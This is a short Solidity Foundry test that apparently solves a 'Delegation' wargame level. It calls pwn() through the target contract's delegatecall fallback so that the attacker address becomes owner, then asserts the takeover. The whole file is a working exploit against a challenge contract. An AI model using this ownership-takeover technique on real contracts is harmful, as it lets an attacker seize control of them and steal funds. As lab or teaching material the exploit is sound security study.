// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../lib/forge-std/src/Test.sol';

interface IDelegation {
  function owner() external view returns (address);
}

contract DelegationTest is Test {
  IDelegation target = IDelegation(0xd66fF3aF0Bed931573767370603cDc3415367E11);
  address alice = vm.addr(1);

  function test() external {
    vm.deal(alice, 1 ether);
    vm.startPrank(alice);
    address(target).call(abi.encodeWithSignature("pwn()"));
    assertEq(target.owner(), alice);
  }
}
